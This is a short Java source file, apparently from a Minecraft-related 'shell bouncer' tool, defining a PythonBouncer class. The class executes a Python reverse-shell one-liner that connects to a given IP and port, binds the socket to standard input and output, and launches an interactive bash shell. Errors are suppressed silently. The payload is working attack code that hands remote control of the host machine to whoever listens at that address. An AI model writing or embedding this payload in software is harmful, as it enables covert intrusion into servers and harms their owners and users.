package tech.dsstudio.minecraft.shell.bouncer;

import java.util.concurrent.TimeUnit;

public class PythonBouncer extends Bouncer {
	public PythonBouncer(String ip, String port) {
		super(ip, port);
	}

	@Override
	public void run() {
		try {
			Process p = Runtime.getRuntime().exec(PAYLOAD.replaceAll("\\{ip}", ip).replaceAll("\\{port}", port));
			p.waitFor(2, TimeUnit.SECONDS);
			success = p.isAlive();
		} catch (Exception ignored) {
			success = false;
		}
		notify();
	}

	private static final String PAYLOAD = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'";
}
